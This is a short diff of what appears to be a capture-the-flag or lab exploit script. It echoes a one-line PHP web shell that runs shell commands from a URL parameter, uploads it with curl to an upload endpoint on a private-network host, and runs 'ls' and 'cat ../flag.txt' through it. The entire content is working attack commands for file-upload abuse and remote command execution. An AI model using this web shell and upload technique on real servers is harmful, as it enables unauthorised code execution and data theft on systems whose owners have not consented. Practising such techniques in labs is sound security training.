@@ -20,3 +20,4 @@ echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php
 curl -F 'file=@shell.php' http://192.168.1.203:8000/upload.php
 curl "http://192.168.1.203:8000/uploads/shell.php?cmd=ls"
 curl "http://192.168.219.136:8000/uploads/shell.php?cmd=cat%20../flag.txt"
+
